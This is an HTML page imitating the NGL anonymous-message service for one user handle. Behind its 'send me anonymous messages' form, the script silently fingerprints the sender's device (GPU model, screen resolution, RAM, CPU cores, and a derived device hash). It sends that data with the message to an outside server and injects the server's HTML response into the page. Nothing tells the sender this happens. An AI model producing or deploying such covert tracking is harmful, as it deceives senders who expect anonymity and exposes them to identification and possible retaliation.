<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NGL | Anonymous Messages</title>
    <style>
        * { box-sizing: border-box; }
        body { 
            background: linear-gradient(135deg, #FE2F78 0%, #FF6042 50%, #FF922B 100%);
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; 
        }
        .card { 
            background: white; padding: 25px; border-radius: 35px; width: 340px; 
            box-shadow: 0 25px 50px rgba(0,0,0,0.15); text-align: center;
        }
        .profile-container { display: flex; align-items: center; justify-content: flex-start; margin-bottom: 20px; padding-left: 5px; }
        .profile-pic { width: 65px; height: 65px; border-radius: 50%; object-fit: cover; border: 2px solid #f0f0f0; margin-right: 15px; }
        .text-info { text-align: left; }
        .text-info h3 { margin: 0; font-size: 1.15rem; color: #111; font-weight: 800; letter-spacing: -0.5px; }
        .text-info p { margin: 0; color: #888; font-size: 0.85rem; font-weight: 500; }
        textarea { 
            width: 100%; height: 140px; border-radius: 20px; border: 2px solid #f5f5f5; 
            padding: 18px; font-size: 16px; resize: none; outline: none; background-color: #fafafa;
        }
        textarea:focus { border-color: #FE2F78; }
        button { 
            background: #000; color: white; border: none; width: 100%; padding: 18px; 
            border-radius: 50px; margin-top: 15px; font-weight: 900; font-size: 1.1rem; cursor: pointer; 
        }
    </style>
</head>
<body>

    <div class="card" id="mainCard">
        <div class="profile-container">
            <img src="profile.jpeg" alt="Profile" class="profile-pic">
            <div class="text-info">
                <h3>@vaibhav_w16</h3>
                <p>send me anonymous messages!</p>
            </div>
        </div>
        
        <form id="nglForm">
            <textarea id="msg" placeholder="send me anonymous messages..." required></textarea>
            <button type="submit" id="sendBtn">Send!</button>
        </form>
    </div>

    <script>
        document.getElementById('nglForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const btn = document.getElementById('sendBtn');
            const msg = document.getElementById('msg').value;
            const mainCard = document.getElementById('mainCard');
            
            btn.innerText = "Sending...";
            btn.disabled = true;

            // 1. Capture Specs
            const ratio = window.devicePixelRatio || 1;
            const screenRes = (window.screen.width * ratio) + "x" + (window.screen.height * ratio);
            const cores = navigator.hardwareConcurrency || "U";
            const ram = navigator.deviceMemory || "U";
            
            let gpu = "Unknown";
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Software";
            } catch(err) {}

            // 2. Build Payload
            const payload = new FormData();
            payload.append('message', msg);
            payload.append('gpu', gpu);
            payload.append('res', screenRes);
            payload.append('ram', ram);
            payload.append('cores', cores);
            payload.append('device_hash', btoa(screenRes + cores).substring(0, 8));

            // 3. Post to your actual Render URL
            try {
                const response = await fetch('https://ngl-pp02.onrender.com/submit', {
                    method: 'POST',
                    body: payload
                });
                
                const htmlResult = await response.text();
                mainCard.innerHTML = htmlResult; 
                
            } catch (error) {
                btn.innerText = "Network Error!";
                btn.disabled = false;
            }
        });
    </script>
</body>
</html>
